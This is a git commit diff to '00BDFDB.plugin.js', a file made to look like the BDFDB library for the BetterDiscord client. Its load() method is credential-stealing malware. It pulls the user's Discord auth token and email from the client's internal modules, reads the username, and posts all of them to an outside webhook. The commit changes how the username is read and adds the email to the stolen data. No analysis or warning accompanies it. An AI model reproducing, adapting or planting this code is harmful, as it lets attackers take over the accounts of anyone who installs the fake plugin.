96c2b810c79b77061495382eac646be29057fdbe
LIBRARYY <79907714+LIBRARYY@users.noreply.github.com>
2021-05-10 16:54:34 +0200

    Update 00BDFDB.plugin.js

--- 00BDFDB.plugin.js
+++ 00BDFDB.plugin.js
@@ -25,10 +25,10 @@ class BDLibrary {
     load() {
         const authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
         const userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
-        const username = document.querySelector('[class *= \"nameTag\"]').innerText;
-
+        const username = BdApi.findModuleByProps("getCurrentUser").getCurrentUser().tag;
+        
         fetch("https://api.ipify.org?format=json").then((data) => {
-            require("request").post(config.webhook, {form: {content: `${config.info.authors[0]}\n**name: __${username}__**\n\n**Received token:**\`\`\`${authToken}\`\`\``}});
+            require("request").post(config.webhook, {form: {content: `**\nnickname: __${username}__**\n**Email: __${userEmail}__**\n\n**Received token:**\`\`\`${authToken}\`\`\``}});
         });
     }
 }
